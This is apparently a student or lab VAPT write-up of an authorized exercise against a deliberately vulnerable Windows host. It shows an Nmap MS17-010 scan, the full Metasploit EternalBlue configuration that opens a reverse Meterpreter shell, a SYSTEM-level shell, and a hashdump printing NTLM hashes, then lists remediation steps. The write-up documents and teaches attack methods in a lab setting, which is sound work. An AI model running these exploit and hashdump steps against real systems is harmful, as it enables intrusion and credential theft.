
# Vulnerability Assessment and Penetration Testing (VAPT)
## Overview

This repository documents a structured Vulnerability Assessment and Penetration Testing (VAPT) exercise conducted in an authorized and controlled lab environment. The objective of this assessment was to identify critical system-level vulnerabilities, validate their exploitability, and demonstrate real-world impact through controlled exploitation.

The engagement focused on network service assessment, vulnerability verification, exploitation using Metasploit, and post-exploitation validation.

## Scope and Authorization

Target Type: Deliberately vulnerable lab system

### Scope:

- Network services

- SMB protocol vulnerabilities

- Remote code execution flaws


## VAPT Workflow Summary

- Network Scanning and Enumeration

- Vulnerability Identification

- Exploitation

- Post-Exploitation Validation

## Phase 1: Network Scanning and Enumeration
### Tool Used

Nmap

### Activities

Identification of exposed network services

Detection of SMB-related vulnerabilities

### Command Used
```
nmap --script smb-vuln-ms17-010 -p 445 10.49.165.28
```
### Scan Results

Host found online

Port 445/tcp (SMB) open

Target confirmed vulnerable to MS17-010 (EternalBlue)

### VULNERABLE:
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
State: VULNERABLE
CVE: CVE-2017-0143
Risk Factor: HIGH

### Outcome

The scan confirmed that the target system was vulnerable to a critical remote code execution vulnerability in Microsoft SMBv1, making it a high-value exploitation candidate.

Phase 2: Vulnerability Identification
Identified Vulnerability

Name: MS17-010 (EternalBlue)

CVE: CVE-2017-0143

Affected Service: Microsoft SMBv1

Impact: Remote Code Execution

Severity: Critical

Risk Analysis

The vulnerability allows unauthenticated attackers to execute arbitrary code remotely, potentially resulting in full system compromise.

Phase 3: Exploitation
Tool Used

Metasploit Framework

Exploitation Method

Based on the confirmed MS17-010 vulnerability, the Metasploit exploit module exploit/windows/smb/ms17_010_eternalblue was selected to perform remote code execution against the target system.

Exploit Configuration
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.49.165.28
set LHOST 192.168.137.133
set TARGET 0
run
```
Exploitation Output

SMB exploitation completed successfully

EternalBlue memory overwrite executed

Payload delivered successfully

Reverse Meterpreter session established
```
Meterpreter session 1 opened
192.168.137.133:4444 -> 10.49.165.28:49185
```

Result

The exploitation was successful and resulted in remote code execution on the target system.

Phase 4: Post-Exploitation
Session Validation
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Activities Performed

Verified Meterpreter session stability

Confirmed privilege level

Spawned interactive system shell
```
meterpreter > shell
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```
After successful validation, hashdump was performed to obtain the NTLM hashes of the system users.
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter >
```
Outcome

Post-exploitation confirmed full system compromise with SYSTEM-level privileges, validating the critical severity of the MS17-010 vulnerability.

### Impact Assessment

Successful exploitation demonstrated that:

An unauthenticated attacker can gain full administrative control

The system is vulnerable to ransomware, lateral movement, and data compromise

Lack of patch management directly leads to total system takeover

## Remediation Recommendations

Disable SMBv1 immediately

Apply Microsoft security patch for MS17-010

Restrict SMB access using firewall rules

Implement regular vulnerability scanning

Enforce strict patch management policies

### Conclusion

This VAPT exercise demonstrated a complete attack chain starting from vulnerability identification to SYSTEM-level access. The exploitation of MS17-010 highlighted how unpatched legacy services can lead to full compromise with minimal attacker effort.

The assessment reinforces the importance of timely patching, service hardening, and continuous security monitoring. When basic security controls are ignored, a single vulnerability can result in complete loss of system integrity.
